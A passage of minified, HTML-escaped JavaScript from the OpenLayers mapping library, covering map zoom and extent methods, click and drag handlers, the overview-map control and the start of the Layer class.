b=null;a&amp;&amp;a.restricted&amp;&amp;this.restrictedExtent?b=this.restrictedExtent:null!=this.baseLayer&amp;&amp;(b=this.baseLayer.maxExtent);return b&#125;,getNumZoomLevels:function()&#123;var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.numZoomLevels);return a&#125;,getExtent:function()&#123;var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.getExtent());return a&#125;,getResolution:function()&#123;var a=null;null!=this.baseLayer?a=this.baseLayer.getResolution():!0===this.allOverlays&amp;&amp;0&lt;this.layers.length&amp;&amp;(a=this.layers[0].getResolution());return a&#125;,getUnits:function()&#123;var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.units);return a&#125;,getScale:function()&#123;var a=null;null!=this.baseLayer&amp;&amp;(a=this.getResolution(),a=OpenLayers.Util.getScaleFromResolution(a,this.baseLayer.units));return a&#125;,getZoomForExtent:function(a,b)&#123;var c=null;null!=this.baseLayer&amp;&amp;(c=this.baseLayer.getZoomForExtent(a,b));return c&#125;,getResolutionForZoom:function(a)&#123;var b=null;this.baseLayer&amp;&amp;(b=this.baseLayer.getResolutionForZoom(a));return b&#125;,getZoomForResolution:function(a,b)&#123;var c=null;null!=this.baseLayer&amp;&amp;(c=this.baseLayer.getZoomForResolution(a,b));return c&#125;,zoomTo:function(a,b)&#123;var c=this;if(c.isValidZoomLevel(a))if(c.baseLayer.wrapDateLine&amp;&amp;(a=c.adjustZoom(a)),c.zoomTween)&#123;var d=c.getResolution(),e=c.getResolutionForZoom(a),f=&#123;scale:1&#125;,d=&#123;scale:d/e&#125;;c.zoomTween.playing&amp;&amp;c.zoomTween.duration&lt;3*c.zoomDuration?c.zoomTween.finish=&#123;scale:c.zoomTween.finish.scale*d.scale&#125;:(b||(e=c.getSize(),b=&#123;x:e.w/2,y:e.h/2&#125;),c.zoomTween.start(f,d,c.zoomDuration,&#123;minFrameRate:50,callbacks:&#123;eachStep:function(a)&#123;var d=c.layerContainerOriginPx;a=a.scale;c.applyTransform(d.x+((a-1)*(d.x-b.x)|0),d.y+((a-1)*(d.y-b.y)|0),a)&#125;,done:function(a)&#123;c.applyTransform();a=c.getResolution()/a.scale;var d=c.getZoomForResolution(a,!0);c.moveTo(c.getZoomTargetCenter(b,a),d,!0)&#125;&#125;&#125;))&#125;else f=b?c.getZoomTargetCenter(b,c.getResolutionForZoom(a)):null,c.setCenter(f,a)&#125;,zoomIn:function()&#123;this.zoomTo(this.getZoom()+1)&#125;,zoomOut:function()&#123;this.zoomTo(this.getZoom()-1)&#125;,zoomToExtent:function(a,b)&#123;a instanceof OpenLayers.Bounds||(a=new OpenLayers.Bounds(a));var c=a.getCenterLonLat();if(this.baseLayer.wrapDateLine)&#123;c=this.getMaxExtent();for(a=a.clone();a.right&lt;a.left;)a.right+=c.getWidth();c=a.getCenterLonLat().wrapDateLine(c)&#125;this.setCenter(c,this.getZoomForExtent(a,b))&#125;,zoomToMaxExtent:function(a)&#123;a=this.getMaxExtent(&#123;restricted:a?a.restricted:!0&#125;);this.zoomToExtent(a)&#125;,zoomToScale:function(a,b)&#123;var c=OpenLayers.Util.getResolutionFromScale(a,this.baseLayer.units),d=this.size.w*c/2,c=this.size.h*c/2,e=this.getCachedCenter(),d=new OpenLayers.Bounds(e.lon-d,e.lat-c,e.lon+d,e.lat+c);this.zoomToExtent(d,b)&#125;,getLonLatFromViewPortPx:function(a)&#123;var b=null;null!=this.baseLayer&amp;&amp;(b=this.baseLayer.getLonLatFromViewPortPx(a));return b&#125;,getViewPortPxFromLonLat:function(a)&#123;var b=null;null!=this.baseLayer&amp;&amp;(b=this.baseLayer.getViewPortPxFromLonLat(a));return b&#125;,getZoomTargetCenter:function(a,b)&#123;var c=null,d=this.getSize(),e=d.w/2-a.x,d=a.y-d.h/2,f=this.getLonLatFromPixel(a);f&amp;&amp;(c=new OpenLayers.LonLat(f.lon+e*b,f.lat+d*b));return c&#125;,getLonLatFromPixel:function(a)&#123;return this.getLonLatFromViewPortPx(a)&#125;,getPixelFromLonLat:function(a)&#123;a=this.getViewPortPxFromLonLat(a);a.x=Math.round(a.x);a.y=Math.round(a.y);return a&#125;,getGeodesicPixelSize:function(a)&#123;var b=a?this.getLonLatFromPixel(a):this.getCachedCenter()||new OpenLayers.LonLat(0,0),c=this.getResolution();a=b.add(-c/2,0);var d=b.add(c/2,0),e=b.add(0,-c/2),b=b.add(0,c/2),c=new OpenLayers.Projection("EPSG:4326"),f=this.getProjectionObject()||c;f.equals(c)||(a.transform(f,c),d.transform(f,c),e.transform(f,c),b.transform(f,c));return new OpenLayers.Size(OpenLayers.Util.distVincenty(a,d),OpenLayers.Util.distVincenty(e,b))&#125;,getViewPortPxFromLayerPx:function(a)&#123;var b=null;null!=a&amp;&amp;(b=a.add(this.layerContainerOriginPx.x,this.layerContainerOriginPx.y));return b&#125;,getLayerPxFromViewPortPx:function(a)&#123;var b=null;null!=a&amp;&amp;(b=a.add(-this.layerContainerOriginPx.x,-this.layerContainerOriginPx.y),isNaN(b.x)||isNaN(b.y))&amp;&amp;(b=null);return b&#125;,getLonLatFromLayerPx:function(a)&#123;a=this.getViewPortPxFromLayerPx(a);return this.getLonLatFromViewPortPx(a)&#125;,getLayerPxFromLonLat:function(a)&#123;a=this.getPixelFromLonLat(a);return this.getLayerPxFromViewPortPx(a)&#125;,applyTransform:function(a,b,c)&#123;c=c||1;var d=this.layerContainerOriginPx,e=1!==c;a=a||d.x;b=b||d.y;var f=this.layerContainerDiv.style,g=this.applyTransform.transform,h=this.applyTransform.template;if(void 0===g&amp;&amp;(g=OpenLayers.Util.vendorPrefix.style("transform"),this.applyTransform.transform=g))&#123;var k=OpenLayers.Element.getStyle(this.viewPortDiv,OpenLayers.Util.vendorPrefix.css("transform"));k&amp;&amp;"none"===k||(h=["translate3d(",",0) ","scale3d(",",1)"],f[g]=[h[0],"0,0",h[1]].join(""));h&amp;&amp;~f[g].indexOf(h[0])||(h=["translate(",") ","scale(",")"]);this.applyTransform.template=h&#125;null===g||"translate3d("!==h[0]&amp;&amp;!0!==e?(f.left=a+"px",f.top=b+"px",null!==g&amp;&amp;(f[g]="")):(!0===e&amp;&amp;"translate("===h[0]&amp;&amp;(a-=d.x,b-=d.y,f.left=d.x+"px",f.top=d.y+"px"),f[g]=[h[0],a,"px,",b,"px",h[1],h[2],c,",",c,h[3]].join(""))&#125;,CLASS_NAME:"OpenLayers.Map"&#125;);OpenLayers.Map.TILE_WIDTH=256;OpenLayers.Map.TILE_HEIGHT=256;OpenLayers.Handler=OpenLayers.Class(&#123;id:null,control:null,map:null,keyMask:null,active:!1,evt:null,touch:!1,initialize:function(a,b,c)&#123;OpenLayers.Util.extend(this,c);this.control=a;this.callbacks=b;(a=this.map||a.map)&amp;&amp;this.setMap(a);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")&#125;,setMap:function(a)&#123;this.map=a&#125;,checkModifiers:function(a)&#123;return null==this.keyMask?!0:((a.shiftKey?OpenLayers.Handler.MOD_SHIFT:0)|(a.ctrlKey?OpenLayers.Handler.MOD_CTRL:0)|(a.altKey?OpenLayers.Handler.MOD_ALT:0)|(a.metaKey?OpenLayers.Handler.MOD_META:0))==this.keyMask&#125;,activate:function()&#123;if(this.active)return!1;for(var a=OpenLayers.Events.prototype.BROWSER_EVENTS,b=0,c=a.length;b&lt;c;b++)this[a[b]]&amp;&amp;this.register(a[b],this[a[b]]);return this.active=!0&#125;,deactivate:function()&#123;if(!this.active)return!1;for(var a=OpenLayers.Events.prototype.BROWSER_EVENTS,b=0,c=a.length;b&lt;c;b++)this[a[b]]&amp;&amp;this.unregister(a[b],this[a[b]]);this.active=this.touch=!1;return!0&#125;,startTouch:function()&#123;if(!this.touch)&#123;this.touch=!0;for(var a="mousedown mouseup mousemove click dblclick mouseout".split(" "),b=0,c=a.length;b&lt;c;b++)this[a[b]]&amp;&amp;this.unregister(a[b],this[a[b]])&#125;&#125;,callback:function(a,b)&#123;a&amp;&amp;this.callbacks[a]&amp;&amp;this.callbacks[a].apply(this.control,b)&#125;,register:function(a,b)&#123;this.map.events.registerPriority(a,this,b);this.map.events.registerPriority(a,this,this.setEvent)&#125;,unregister:function(a,b)&#123;this.map.events.unregister(a,this,b);this.map.events.unregister(a,this,this.setEvent)&#125;,setEvent:function(a)&#123;this.evt=a;return!0&#125;,destroy:function()&#123;this.deactivate();this.control=this.map=null&#125;,CLASS_NAME:"OpenLayers.Handler"&#125;);OpenLayers.Handler.MOD_NONE=0;OpenLayers.Handler.MOD_SHIFT=1;OpenLayers.Handler.MOD_CTRL=2;OpenLayers.Handler.MOD_ALT=4;OpenLayers.Handler.MOD_META=8;OpenLayers.Handler.Click=OpenLayers.Class(OpenLayers.Handler,&#123;delay:300,single:!0,"double":!1,pixelTolerance:0,dblclickTolerance:13,stopSingle:!1,stopDouble:!1,timerId:null,down:null,last:null,first:null,rightclickTimerId:null,touchstart:function(a)&#123;this.startTouch();this.down=this.getEventInfo(a);this.last=this.getEventInfo(a);return!0&#125;,touchmove:function(a)&#123;this.last=this.getEventInfo(a);return!0&#125;,touchend:function(a)&#123;this.down&amp;&amp;(a.xy=this.last.xy,a.lastTouches=this.last.touches,this.handleSingle(a),this.down=null);return!0&#125;,mousedown:function(a)&#123;this.down=this.getEventInfo(a);this.last=this.getEventInfo(a);return!0&#125;,mouseup:function(a)&#123;var b=!0;this.checkModifiers(a)&amp;&amp;(this.control.handleRightClicks&amp;&amp;OpenLayers.Event.isRightClick(a))&amp;&amp;(b=this.rightclick(a));return b&#125;,rightclick:function(a)&#123;if(this.passesTolerance(a))&#123;if(null!=this.rightclickTimerId)return this.clearTimer(),this.callback("dblrightclick",[a]),!this.stopDouble;a=this["double"]?OpenLayers.Util.extend(&#123;&#125;,a):this.callback("rightclick",[a]);a=OpenLayers.Function.bind(this.delayedRightCall,this,a);this.rightclickTimerId=window.setTimeout(a,this.delay)&#125;return!this.stopSingle&#125;,delayedRightCall:function(a)&#123;this.rightclickTimerId=null;a&amp;&amp;this.callback("rightclick",[a])&#125;,click:function(a)&#123;this.last||(this.last=this.getEventInfo(a));this.handleSingle(a);return!this.stopSingle&#125;,dblclick:function(a)&#123;this.handleDouble(a);return!this.stopDouble&#125;,handleDouble:function(a)&#123;this.passesDblclickTolerance(a)&amp;&amp;(this["double"]&amp;&amp;this.callback("dblclick",[a]),this.clearTimer())&#125;,handleSingle:function(a)&#123;this.passesTolerance(a)&amp;&amp;(null!=this.timerId?(this.last.touches&amp;&amp;1===this.last.touches.length&amp;&amp;(this["double"]&amp;&amp;OpenLayers.Event.preventDefault(a),this.handleDouble(a)),this.last.touches&amp;&amp;2===this.last.touches.length||this.clearTimer()):(this.first=this.getEventInfo(a),a=this.single?OpenLayers.Util.extend(&#123;&#125;,a):null,this.queuePotentialClick(a)))&#125;,queuePotentialClick:function(a)&#123;this.timerId=window.setTimeout(OpenLayers.Function.bind(this.delayedCall,this,a),this.delay)&#125;,passesTolerance:function(a)&#123;var b=!0;if(null!=this.pixelTolerance&amp;&amp;this.down&amp;&amp;this.down.xy&amp;&amp;(b=this.pixelTolerance&gt;=this.down.xy.distanceTo(a.xy))&amp;&amp;this.touch&amp;&amp;this.down.touches.length===this.last.touches.length)&#123;a=0;for(var c=this.down.touches.length;a&lt;c;++a)if(this.getTouchDistance(this.down.touches[a],this.last.touches[a])&gt;this.pixelTolerance)&#123;b=!1;break&#125;&#125;return b&#125;,getTouchDistance:function(a,b)&#123;return Math.sqrt(Math.pow(a.clientX-b.clientX,2)+Math.pow(a.clientY-b.clientY,2))&#125;,passesDblclickTolerance:function(a)&#123;a=!0;this.down&amp;&amp;this.first&amp;&amp;(a=this.down.xy.distanceTo(this.first.xy)&lt;=this.dblclickTolerance);return a&#125;,clearTimer:function()&#123;null!=this.timerId&amp;&amp;(window.clearTimeout(this.timerId),this.timerId=null);null!=this.rightclickTimerId&amp;&amp;(window.clearTimeout(this.rightclickTimerId),this.rightclickTimerId=null)&#125;,delayedCall:function(a)&#123;this.timerId=null;a&amp;&amp;this.callback("click",[a])&#125;,getEventInfo:function(a)&#123;var b;if(a.touches)&#123;var c=a.touches.length;b=Array(c);for(var d,e=0;e&lt;c;e++)d=a.touches[e],b[e]=&#123;clientX:d.olClientX,clientY:d.olClientY&#125;&#125;return&#123;xy:a.xy,touches:b&#125;&#125;,deactivate:function()&#123;var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.clearTimer(),this.last=this.first=this.down=null,a=!0);return a&#125;,CLASS_NAME:"OpenLayers.Handler.Click"&#125;);OpenLayers.Handler.Drag=OpenLayers.Class(OpenLayers.Handler,&#123;started:!1,stopDown:!0,dragging:!1,last:null,start:null,lastMoveEvt:null,oldOnselectstart:null,interval:0,timeoutId:null,documentDrag:!1,documentEvents:null,initialize:function(a,b,c)&#123;OpenLayers.Handler.prototype.initialize.apply(this,arguments);if(!0===this.documentDrag)&#123;var d=this;this._docMove=function(a)&#123;d.mousemove(&#123;xy:&#123;x:a.clientX,y:a.clientY&#125;,element:document&#125;)&#125;;this._docUp=function(a)&#123;d.mouseup(&#123;xy:&#123;x:a.clientX,y:a.clientY&#125;&#125;)&#125;&#125;&#125;,dragstart:function(a)&#123;var b=!0;this.dragging=!1;this.checkModifiers(a)&amp;&amp;(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))?(this.started=!0,this.last=this.start=a.xy,OpenLayers.Element.addClass(this.map.viewPortDiv,"olDragDown"),this.down(a),this.callback("down",[a.xy]),OpenLayers.Event.preventDefault(a),this.oldOnselectstart||(this.oldOnselectstart=document.onselectstart?document.onselectstart:OpenLayers.Function.True),document.onselectstart=OpenLayers.Function.False,b=!this.stopDown):(this.started=!1,this.last=this.start=null);return b&#125;,dragmove:function(a)&#123;this.lastMoveEvt=a;!this.started||(this.timeoutId||a.xy.x==this.last.x&amp;&amp;a.xy.y==this.last.y)||(!0===this.documentDrag&amp;&amp;this.documentEvents&amp;&amp;(a.element===document?(this.adjustXY(a),this.setEvent(a)):this.removeDocumentEvents()),0&lt;this.interval&amp;&amp;(this.timeoutId=setTimeout(OpenLayers.Function.bind(this.removeTimeout,this),this.interval)),this.dragging=!0,this.move(a),this.callback("move",[a.xy]),this.oldOnselectstart||(this.oldOnselectstart=document.onselectstart,document.onselectstart=OpenLayers.Function.False),this.last=a.xy);return!0&#125;,dragend:function(a)&#123;if(this.started)&#123;!0===this.documentDrag&amp;&amp;this.documentEvents&amp;&amp;(this.adjustXY(a),this.removeDocumentEvents());var b=this.start!=this.last;this.dragging=this.started=!1;OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDragDown");this.up(a);this.callback("up",[a.xy]);b&amp;&amp;this.callback("done",[a.xy]);document.onselectstart=this.oldOnselectstart&#125;return!0&#125;,down:function(a)&#123;&#125;,move:function(a)&#123;&#125;,up:function(a)&#123;&#125;,out:function(a)&#123;&#125;,mousedown:function(a)&#123;return this.dragstart(a)&#125;,touchstart:function(a)&#123;this.startTouch();return this.dragstart(a)&#125;,mousemove:function(a)&#123;return this.dragmove(a)&#125;,touchmove:function(a)&#123;return this.dragmove(a)&#125;,removeTimeout:function()&#123;this.timeoutId=null;this.dragging&amp;&amp;this.mousemove(this.lastMoveEvt)&#125;,mouseup:function(a)&#123;return this.dragend(a)&#125;,touchend:function(a)&#123;a.xy=this.last;return this.dragend(a)&#125;,mouseout:function(a)&#123;if(this.started&amp;&amp;OpenLayers.Util.mouseLeft(a,this.map.viewPortDiv))if(!0===this.documentDrag)this.addDocumentEvents();else&#123;var b=this.start!=this.last;this.dragging=this.started=!1;OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDragDown");this.out(a);this.callback("out",[]);b&amp;&amp;this.callback("done",[a.xy]);document.onselectstart&amp;&amp;(document.onselectstart=this.oldOnselectstart)&#125;return!0&#125;,click:function(a)&#123;return this.start==this.last&#125;,activate:function()&#123;var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&amp;&amp;(this.dragging=!1,a=!0);return a&#125;,deactivate:function()&#123;var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.dragging=this.started=!1,this.last=this.start=null,a=!0,OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDragDown"));return a&#125;,adjustXY:function(a)&#123;var b=OpenLayers.Util.pagePosition(this.map.viewPortDiv);a.xy.x-=b[0];a.xy.y-=b[1]&#125;,addDocumentEvents:function()&#123;OpenLayers.Element.addClass(document.body,"olDragDown");this.documentEvents=!0;OpenLayers.Event.observe(document,"mousemove",this._docMove);OpenLayers.Event.observe(document,"mouseup",this._docUp)&#125;,removeDocumentEvents:function()&#123;OpenLayers.Element.removeClass(document.body,"olDragDown");this.documentEvents=!1;OpenLayers.Event.stopObserving(document,"mousemove",this._docMove);OpenLayers.Event.stopObserving(document,"mouseup",this._docUp)&#125;,CLASS_NAME:"OpenLayers.Handler.Drag"&#125;);OpenLayers.Control.OverviewMap=OpenLayers.Class(OpenLayers.Control,&#123;element:null,ovmap:null,size:&#123;w:180,h:90&#125;,layers:null,minRectSize:15,minRectDisplayClass:"RectReplacement",minRatio:8,maxRatio:32,mapOptions:null,autoPan:!1,handlers:null,resolutionFactor:1,maximized:!1,maximizeTitle:"",minimizeTitle:"",initialize:function(a)&#123;this.layers=[];this.handlers=&#123;&#125;;OpenLayers.Control.prototype.initialize.apply(this,[a])&#125;,destroy:function()&#123;this.mapDiv&amp;&amp;(this.handlers.click&amp;&amp;this.handlers.click.destroy(),this.handlers.drag&amp;&amp;this.handlers.drag.destroy(),this.ovmap&amp;&amp;this.ovmap.viewPortDiv.removeChild(this.extentRectangle),this.extentRectangle=null,this.rectEvents&amp;&amp;(this.rectEvents.destroy(),this.rectEvents=null),this.ovmap&amp;&amp;(this.ovmap.destroy(),this.ovmap=null),this.element.removeChild(this.mapDiv),this.mapDiv=null,this.div.removeChild(this.element),this.element=null,this.maximizeDiv&amp;&amp;(this.div.removeChild(this.maximizeDiv),this.maximizeDiv=null),this.minimizeDiv&amp;&amp;(this.div.removeChild(this.minimizeDiv),this.minimizeDiv=null),this.map.events.un(&#123;buttonclick:this.onButtonClick,moveend:this.update,changebaselayer:this.baseLayerDraw,scope:this&#125;),OpenLayers.Control.prototype.destroy.apply(this,arguments))&#125;,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);if(0===this.layers.length)if(this.map.baseLayer)this.layers=[this.map.baseLayer.clone()];else return this.map.events.register("changebaselayer",this,this.baseLayerDraw),this.div;this.element=document.createElement("div");this.element.className=this.displayClass+"Element";this.element.style.display="none";this.mapDiv=document.createElement("div");this.mapDiv.style.width=this.size.w+"px";this.mapDiv.style.height=this.size.h+"px";this.mapDiv.style.position="relative";this.mapDiv.style.overflow="hidden";this.mapDiv.id=OpenLayers.Util.createUniqueID("overviewMap");this.extentRectangle=document.createElement("div");this.extentRectangle.style.position="absolute";this.extentRectangle.style.zIndex=1E3;this.extentRectangle.className=this.displayClass+"ExtentRectangle";this.element.appendChild(this.mapDiv);this.div.appendChild(this.element);if(this.outsideViewport)this.element.style.display="";else&#123;this.div.className+=" "+this.displayClass+"Container";var a=OpenLayers.Util.getImageLocation("layer-switcher-maximize.png");this.maximizeDiv=OpenLayers.Util.createAlphaImageDiv(this.displayClass+"MaximizeButton",null,null,a,"absolute");this.maximizeDiv.style.display="none";this.maximizeDiv.className=this.displayClass+"MaximizeButton olButton";this.maximizeTitle&amp;&amp;(this.maximizeDiv.title=this.maximizeTitle);this.div.appendChild(this.maximizeDiv);a=OpenLayers.Util.getImageLocation("layer-switcher-minimize.png");this.minimizeDiv=OpenLayers.Util.createAlphaImageDiv("OpenLayers_Control_minimizeDiv",null,null,a,"absolute");this.minimizeDiv.style.display="none";this.minimizeDiv.className=this.displayClass+"MinimizeButton olButton";this.minimizeTitle&amp;&amp;(this.minimizeDiv.title=this.minimizeTitle);this.div.appendChild(this.minimizeDiv);this.minimizeControl()&#125;this.map.getExtent()&amp;&amp;this.update();this.map.events.on(&#123;buttonclick:this.onButtonClick,moveend:this.update,scope:this&#125;);this.maximized&amp;&amp;this.maximizeControl();return this.div&#125;,baseLayerDraw:function()&#123;this.draw();this.map.events.unregister("changebaselayer",this,this.baseLayerDraw)&#125;,rectDrag:function(a)&#123;var b=this.handlers.drag.last.x-a.x,c=this.handlers.drag.last.y-a.y;if(0!=b||0!=c)&#123;var d=this.rectPxBounds.top,e=this.rectPxBounds.left;a=Math.abs(this.rectPxBounds.getHeight());var f=this.rectPxBounds.getWidth(),c=Math.max(0,d-c),c=Math.min(c,this.ovmap.size.h-this.hComp-a),b=Math.max(0,e-b),b=Math.min(b,this.ovmap.size.w-this.wComp-f);this.setRectPxBounds(new OpenLayers.Bounds(b,c+a,b+f,c))&#125;&#125;,mapDivClick:function(a)&#123;var b=this.rectPxBounds.getCenterPixel(),c=a.xy.x-b.x,d=a.xy.y-b.y,e=this.rectPxBounds.top,f=this.rectPxBounds.left;a=Math.abs(this.rectPxBounds.getHeight());b=this.rectPxBounds.getWidth();d=Math.max(0,e+d);d=Math.min(d,this.ovmap.size.h-a);c=Math.max(0,f+c);c=Math.min(c,this.ovmap.size.w-b);this.setRectPxBounds(new OpenLayers.Bounds(c,d+a,c+b,d));this.updateMapToRect()&#125;,onButtonClick:function(a)&#123;a.buttonElement===this.minimizeDiv?this.minimizeControl():a.buttonElement===this.maximizeDiv&amp;&amp;this.maximizeControl()&#125;,maximizeControl:function(a)&#123;this.element.style.display="";this.showToggle(!1);null!=a&amp;&amp;OpenLayers.Event.stop(a)&#125;,minimizeControl:function(a)&#123;this.element.style.display="none";this.showToggle(!0);null!=a&amp;&amp;OpenLayers.Event.stop(a)&#125;,showToggle:function(a)&#123;this.maximizeDiv&amp;&amp;(this.maximizeDiv.style.display=a?"":"none");this.minimizeDiv&amp;&amp;(this.minimizeDiv.style.display=a?"none":"")&#125;,update:function()&#123;null==this.ovmap&amp;&amp;this.createMap();!this.autoPan&amp;&amp;this.isSuitableOverview()||this.updateOverview();this.updateRectToMap()&#125;,isSuitableOverview:function()&#123;var a=this.map.getExtent(),b=this.map.getMaxExtent(),a=new OpenLayers.Bounds(Math.max(a.left,b.left),Math.max(a.bottom,b.bottom),Math.min(a.right,b.right),Math.min(a.top,b.top));this.ovmap.getProjection()!=this.map.getProjection()&amp;&amp;(a=a.transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject()));b=this.ovmap.getResolution()/this.map.getResolution();return b&gt;this.minRatio&amp;&amp;b&lt;=this.maxRatio&amp;&amp;this.ovmap.getExtent().containsBounds(a)&#125;,updateOverview:function()&#123;var a=this.map.getResolution(),b=this.ovmap.getResolution(),c=b/a;c&gt;this.maxRatio?b=this.minRatio*a:c&lt;=this.minRatio&amp;&amp;(b=this.maxRatio*a);this.ovmap.getProjection()!=this.map.getProjection()?(a=this.map.center.clone(),a.transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject())):a=this.map.center;this.ovmap.setCenter(a,this.ovmap.getZoomForResolution(b*this.resolutionFactor));this.updateRectToMap()&#125;,createMap:function()&#123;var a=OpenLayers.Util.extend(&#123;controls:[],maxResolution:"auto",fallThrough:!1&#125;,this.mapOptions);this.ovmap=new OpenLayers.Map(this.mapDiv,a);this.ovmap.viewPortDiv.appendChild(this.extentRectangle);OpenLayers.Event.stopObserving(window,"unload",this.ovmap.unloadDestroy);this.ovmap.addLayers(this.layers);this.ovmap.zoomToMaxExtent();this.wComp=(this.wComp=parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-left-width"))+parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-right-width")))?this.wComp:2;this.hComp=(this.hComp=parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-top-width"))+parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-bottom-width")))?this.hComp:2;this.handlers.drag=new OpenLayers.Handler.Drag(this,&#123;move:this.rectDrag,done:this.updateMapToRect&#125;,&#123;map:this.ovmap&#125;);this.handlers.click=new OpenLayers.Handler.Click(this,&#123;click:this.mapDivClick&#125;,&#123;single:!0,"double":!1,stopSingle:!0,stopDouble:!0,pixelTolerance:1,map:this.ovmap&#125;);this.handlers.click.activate();this.rectEvents=new OpenLayers.Events(this,this.extentRectangle,null,!0);this.rectEvents.register("mouseover",this,function(a)&#123;this.handlers.drag.active||this.map.dragging||this.handlers.drag.activate()&#125;);this.rectEvents.register("mouseout",this,function(a)&#123;this.handlers.drag.dragging||this.handlers.drag.deactivate()&#125;);if(this.ovmap.getProjection()!=this.map.getProjection())&#123;var a=this.map.getProjectionObject().getUnits()||this.map.units||this.map.baseLayer.units,b=this.ovmap.getProjectionObject().getUnits()||this.ovmap.units||this.ovmap.baseLayer.units;this.resolutionFactor=a&amp;&amp;b?OpenLayers.INCHES_PER_UNIT[a]/OpenLayers.INCHES_PER_UNIT[b]:1&#125;&#125;,updateRectToMap:function()&#123;var a;a=this.ovmap.getProjection()!=this.map.getProjection()?this.map.getExtent().transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject()):this.map.getExtent();(a=this.getRectBoundsFromMapBounds(a))&amp;&amp;this.setRectPxBounds(a)&#125;,updateMapToRect:function()&#123;var a=this.getMapBoundsFromRectBounds(this.rectPxBounds);this.ovmap.getProjection()!=this.map.getProjection()&amp;&amp;(a=a.transform(this.ovmap.getProjectionObject(),this.map.getProjectionObject()));this.map.panTo(a.getCenterLonLat())&#125;,setRectPxBounds:function(a)&#123;var b=Math.max(a.top,0),c=Math.max(a.left,0),d=Math.min(a.top+Math.abs(a.getHeight()),this.ovmap.size.h-this.hComp);a=Math.min(a.left+a.getWidth(),this.ovmap.size.w-this.wComp);var e=Math.max(a-c,0),f=Math.max(d-b,0);e&lt;this.minRectSize||f&lt;this.minRectSize?(this.extentRectangle.className=this.displayClass+this.minRectDisplayClass,e=c+e/2-this.minRectSize/2,this.extentRectangle.style.top=Math.round(b+f/2-this.minRectSize/2)+"px",this.extentRectangle.style.left=Math.round(e)+"px",this.extentRectangle.style.height=this.minRectSize+"px",this.extentRectangle.style.width=this.minRectSize+"px"):(this.extentRectangle.className=this.displayClass+"ExtentRectangle",this.extentRectangle.style.top=Math.round(b)+"px",this.extentRectangle.style.left=Math.round(c)+"px",this.extentRectangle.style.height=Math.round(f)+"px",this.extentRectangle.style.width=Math.round(e)+"px");this.rectPxBounds=new OpenLayers.Bounds(Math.round(c),Math.round(d),Math.round(a),Math.round(b))&#125;,getRectBoundsFromMapBounds:function(a)&#123;var b=this.getOverviewPxFromLonLat(&#123;lon:a.left,lat:a.bottom&#125;);a=this.getOverviewPxFromLonLat(&#123;lon:a.right,lat:a.top&#125;);var c=null;b&amp;&amp;a&amp;&amp;(c=new OpenLayers.Bounds(b.x,b.y,a.x,a.y));return c&#125;,getMapBoundsFromRectBounds:function(a)&#123;var b=this.getLonLatFromOverviewPx(&#123;x:a.left,y:a.bottom&#125;);a=this.getLonLatFromOverviewPx(&#123;x:a.right,y:a.top&#125;);return new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat)&#125;,getLonLatFromOverviewPx:function(a)&#123;var b=this.ovmap.size,c=this.ovmap.getResolution(),d=this.ovmap.getExtent().getCenterLonLat();return&#123;lon:d.lon+(a.x-b.w/2)*c,lat:d.lat-(a.y-b.h/2)*c&#125;&#125;,getOverviewPxFromLonLat:function(a)&#123;var b=this.ovmap.getResolution(),c=this.ovmap.getExtent();if(c)return&#123;x:Math.round(1/b*(a.lon-c.left)),y:Math.round(1/b*(c.top-a.lat))&#125;&#125;,CLASS_NAME:"OpenLayers.Control.OverviewMap"&#125;);OpenLayers.Layer=OpenLayers.Class(&#123;id:null,name:null,div:null,opacity:1,alwaysInRange:null,RESOLUTION_PROPERTIES:"scales resolutions maxScale minScale maxResolution minResolution numZoomLevels maxZoomLevel".split(" "),events:null,map:null,isBaseLayer:!1,alpha:!1,displayInLayerSwitcher:!0,visibility:!0,attribution:null,inRange:!1,imageSize:null,options:null,eventListeners:null,gutter:0,projection:null,units:null,scales:null,resolutions:null,maxExtent:null,minExtent:null,maxResolution:null,minResolution:null,numZoomLevels:null,minScale:null,maxScale:null,displayOutsideMaxExtent:!1,wrapDateLine:!1,metadata:null,initialize:function(a,b)&#123;this.metadata=&#123;&#125;;b=OpenLayers.Util.extend(&#123;&#125;,b);null!=this.alwaysInRange&amp;&amp;(b.alwaysInRange=this.alwaysInRange);this.addOptions(b);this.name=a;if(null==this.id&amp;&amp;(this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_"),this.div=OpenLayers.Util.createDiv(this.id),this.div.style.width="100%",this.div.style.height="100%",this.div.dir="ltr",this.events=new OpenLayers.Events(this,this.div),this.eventListeners instanceof Object))this.events.on(this.eventListeners)&#125;,destroy:function(a)&#123;null==a&amp;&amp;(a=!0);null!=this.map&amp;&amp;this.map.removeLayer(this,a);this.options=this.div=this.name=this.map=this.projection=null;this.events&amp;&amp;(this.eventListeners&amp;&amp;this.events.un(this.eventListeners),this.events.destroy());this.events=this.eventListeners=null&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer(this.name,this.getOptions()));OpenLayers.Util.applyDefaults(a,this);a.map=null;return a&#125;,getOptions:function()&#123;var a=&#123;&#125;,b;for(b in this.options)a[b]=this[b];return a&#125;,setName:function(a)&#123;a!=this.name&amp;&amp;(this.name=a,null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",&#123;layer:this,property:"name"&#125;))&#125;,addOptions:function(a,b)&#123;null==this.options&amp;&amp;(this.options=&#123;&#125;);a&amp;&amp;("string"==typeof 